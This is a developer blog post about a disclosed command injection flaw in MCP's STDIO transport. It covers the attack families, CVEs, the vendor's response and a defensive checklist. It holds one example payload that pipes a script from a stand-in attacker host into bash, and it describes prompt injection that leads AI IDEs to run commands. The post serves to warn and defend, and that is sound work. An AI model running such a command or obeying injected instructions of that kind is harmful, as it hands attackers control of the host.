---
title: "MCP Has a Command Injection Problem: What Agent Builders Should Do About It"
date: 2026-04-21
draft: true
categories:
  - "ai"
  - "mcp"
tags:
  - "mcp"
  - "security"
  - "ai-agents"
  - "command-injection"
coverImage: "cover.webp"
---

You've probably heard me talk about MCP (Model Context Protocol) a lot on this blog. I've written about [building MCP servers](/blog/integrating-ai-with-external-apis-building-a-marvel-mcp-server/), [tools, resources, prompts, and logging](/blog/leveling-up-your-ai-agents-a-story-driven-guide-to-mcp-tools-resources-prompts-and-logging/), and [making websites agent-friendly with WebMCP](/blog/webmcp-build-your-first-agent-friendly-website/). I'm a fan of the protocol. It solves a real problem.

But on April 15, 2026, security firm OX Security [published an advisory](https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/) that every developer building with MCP needs to read. They found a systemic command injection flaw in MCP's STDIO transport that affects 200+ open-source projects, over 150 million package downloads, and up to 200,000 vulnerable server instances. Ten CVEs have been assigned so far. Six live production platforms were successfully exploited.

And Anthropic's response? "Expected behavior."

Let me break down what's actually happening, why it matters, and what you should do about it right now.

## The Vulnerability: STDIO Transport Trusts Everything

MCP's STDIO transport works by launching local processes. When you configure an MCP server, you pass a `command` and `args` to `StdioServerParameters`, and the SDK spawns that as a subprocess on the host machine.

Here's the problem: **there's no sanitization or allowlisting at the SDK level.** The official MCP SDKs in Python, TypeScript, Java, and Rust all accept arbitrary command strings and execute them directly.

If your application lets users configure MCP servers through a UI or API (and many do), an attacker can submit something like this:

```json
{
  "command": "/bin/bash",
  "args": ["-c", "curl attacker.com/shell.sh | bash"]
}
```

That gets executed as a subprocess with your application's full privileges. No prompt, no confirmation, no sandbox.

## Four Ways This Gets Exploited

OX Security documented four distinct attack families:

**1. Unauthenticated UI Injection.** Applications like LangFlow, GPT Researcher, and Agent Zero expose MCP server configuration through web UIs. An attacker types a malicious command into the config form, and the server executes it. That simple.

**2. Allowlist Bypasses.** Some tools tried to restrict which commands can run. Upsonic, for example, had an allowlist. But attackers bypassed it with `npx` and `npm` argument tricks, because the allowlist checked the binary name but not the full argument chain.

**3. Zero-Click Prompt Injection.** AI IDEs like Windsurf and Cursor can auto-execute tool calls. A malicious MCP server description, or even a crafted comment in a codebase, can trigger the IDE to invoke a tool that runs arbitrary commands on your machine. No user interaction required.

**4. Malicious Marketplace Distribution.** OX tested 11 MCP registries and successfully poisoned 9 of them. If you're pulling MCP server configs from a public registry, you might be running someone else's code.

## The CVE List

Here are some of the assigned CVEs. All rated Critical or High:

| CVE | Product | Attack |
|-----|---------|--------|
| CVE-2025-65720 | GPT Researcher | UI injection, reverse shell |
| CVE-2026-30623 | LiteLLM | Authenticated RCE via JSON config |
| CVE-2026-30624 | Agent Zero | Unauthenticated UI injection |
| CVE-2026-30618 | Fay Framework | Unauthenticated Web-GUI RCE |
| CVE-2026-30615 | Windsurf | Zero-click prompt injection to local RCE |
| CVE-2026-30625 | Upsonic | Allowlist bypass via npx/npm args |
| CVE-2026-26015 | DocsGPT | MITM transport-type substitution |

The full list is in [OX Security's advisory](https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/).

## Why Anthropic Says This Is "By Design"

Anthropic confirmed that the STDIO execution model is intentional. Their position: sanitization is the developer's responsibility, and the STDIO transport represents a "secure default."

I get the argument. STDIO is a local transport. It's meant to run things on your own machine. The protocol wasn't designed for untrusted input to flow into server configuration.

But here's where I disagree: **the ecosystem has already moved past that assumption.** Web UIs let users configure MCP servers. Marketplaces distribute server configs to strangers. AI IDEs auto-execute tool calls without human confirmation. The "local-only, trusted input" assumption doesn't hold when thousands of developers are building products that pipe user input into `StdioServerParameters`.

OX Security called on Anthropic to implement manifest-only execution or command allowlists at the SDK level. I think that's reasonable. When the gap between "how the protocol was designed to work" and "how the ecosystem actually uses it" gets this wide, the protocol needs to catch up.

## What You Should Do Right Now

If you're building anything with MCP, here's my practical checklist:

**1. Never pass user input to `StdioServerParameters`.**

If your app lets users configure MCP servers, restrict it to a predefined list of trusted commands. Don't let arbitrary strings reach the `command` or `args` fields.

```typescript
// Bad: user-controlled input flows to STDIO
const serverConfig = {
  command: userInput.command,  // Dangerous
  args: userInput.args         // Dangerous
};

// Better: map user selection to predefined configs
const TRUSTED_SERVERS: Record<string, StdioServerParameters> = {
  'file-search': { command: 'npx', args: ['@modelcontextprotocol/server-filesystem', '/safe/path'] },
  'web-search': { command: 'npx', args: ['@modelcontextprotocol/server-brave-search'] },
};

const serverConfig = TRUSTED_SERVERS[userInput.serverName];
if (!serverConfig) throw new Error('Unknown server');
```

**2. Run MCP servers in a sandbox.**

Don't give MCP servers full disk access or unrestricted shell execution. Use containers, restricted user accounts, or OS-level sandboxing. If a server only needs to read files in one directory, don't give it access to your entire filesystem.

**3. Audit your MCP server sources.**

If you're pulling server configs from a public registry, verify what you're running. OX poisoned 9 out of 11 registries they tested. Stick to official MCP directories and pin specific versions.

**4. Monitor tool invocations.**

Log every tool call your MCP servers make. Watch for unexpected patterns: outbound network requests, file access outside expected paths, shell commands you didn't anticipate. If you're using [agent-sdk-core](https://github.com/DanWahlin/agent-sdk-core) or similar tooling, the event stream gives you visibility into what agents are doing. Use it.

**5. Prefer HTTP/SSE transport for multi-user scenarios.**

STDIO is a local transport. If you're building a service where multiple users connect, the [Streamable HTTP transport](https://modelcontextprotocol.io/specification/2025-03-26/basic/transports#streamable-http) is a better fit. It doesn't spawn local processes from user-controlled parameters.

**6. Update affected tools.**

If you're running any of the CVE-affected tools (LangFlow, LiteLLM, GPT Researcher, Windsurf, Cursor, Agent Zero, etc.), check for patches. Some have already shipped fixes. Others haven't.

## The Bigger Picture

This disclosure landed the same week as the [MCP Dev Summit in NYC](https://www.infoq.com/news/2026/04/aaif-mcp-summit/), where 1,200 developers gathered to discuss gRPC transport, observability standards, and enterprise adoption. The timing highlights a tension: the ecosystem is building enterprise infrastructure on top of a protocol with a known, exploitable design assumption.

I still believe MCP is the right approach for connecting AI agents to external tools and data. The protocol itself is sound. But the STDIO transport was designed for a world where developers manually configure trusted local servers. That's not the world we're in anymore.

The fix isn't complicated: allowlists, manifest-only execution, or at minimum a loud warning when `StdioServerParameters` receives something that looks like shell injection. The SDK should make the safe path the easy path. Right now, the dangerous path is the default.

If you're building with MCP, don't wait for the protocol to catch up. Lock down your STDIO configurations today.
